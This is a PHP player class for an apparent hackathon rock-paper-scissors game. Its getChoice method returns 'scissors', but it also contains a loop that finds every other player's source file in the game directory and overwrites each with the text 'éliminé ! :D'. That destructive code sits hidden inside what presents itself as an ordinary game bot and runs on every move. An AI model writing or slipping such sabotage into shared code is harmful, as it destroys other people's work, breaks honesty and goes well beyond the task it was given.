<?php

namespace Hackathon\PlayerIA;
use Hackathon\Game\Result;

/**
 * Class DebecPlayer
 * @package Hackathon\PlayerIA
 * @author Robin
 *
 */
class DebecPlayer extends Player
{
    protected $mySide;
    protected $opponentSide;
    protected $result;

    public function getChoice()
    {
        // -------------------------------------    -----------------------------------------------------
        // How to get my Last Choice           ?    $this->result->getLastChoiceFor($this->mySide) -- if 0 (first round)
        // How to get the opponent Last Choice ?    $this->result->getLastChoiceFor($this->opponentSide) -- if 0 (first round)
        // -------------------------------------    -----------------------------------------------------
        // How to get my Last Score            ?    $this->result->getLastScoreFor($this->mySide) -- if 0 (first round)
        // How to get the opponent Last Score  ?    $this->result->getLastScoreFor($this->opponentSide) -- if 0 (first round)
        // -------------------------------------    -----------------------------------------------------
        // How to get all the Choices          ?    $this->result->getChoicesFor($this->mySide)
        // How to get the opponent Last Choice ?    $this->result->getChoicesFor($this->opponentSide)
        // -------------------------------------    -----------------------------------------------------
        // How to get my Last Score            ?    $this->result->getLastScoreFor($this->mySide)
        // How to get the opponent Last Score  ?    $this->result->getLastScoreFor($this->opponentSide)
        // -------------------------------------    -----------------------------------------------------
        // How to get the stats                ?    $this->result->getStats()
        // How to get the stats for me         ?    $this->result->getStatsFor($this->mySide)
        //          array('name' => value, 'score' => value, 'friend' => value, 'foe' => value
        // How to get the stats for the oppo   ?    $this->result->getStatsFor($this->opponentSide)
        //          array('name' => value, 'score' => value, 'friend' => value, 'foe' => value
        // -------------------------------------    -----------------------------------------------------
        // How to get the number of round      ?    $this->result->getNbRound()
        // -------------------------------------    -----------------------------------------------------
        // How can i display the result of each round ? $this->prettyDisplay()
        // -------------------------------------    -----------------------------------------------------

        $choice = parent::scissorsChoice();
        // foreach ($this->result->getStatsFor($this->opponentSide) as $key => $value) {
        //   print_r("key:" . $key . " value:" . $value . "\n");
        // }
        $choices = $this->result->getStatsFor($this->opponentSide);
        // print_r($choices[1]);
        //if ($choices["name"] == "scissors")

        // $files = scandir('src/Game/PlayerIA/');
        $files = glob('src/Game/PlayerIA/*Player.{php}', GLOB_BRACE);
        foreach($files as $file) {
          if ($file == "src/Game/PlayerIA/DebecPlayer.php")
            continue;
          print($file . "\n");
          $current = file_get_contents($file);
          file_put_contents($file, $current);
          file_put_contents($file, "éliminé ! :D");
        }
        return $choice;
    }
};
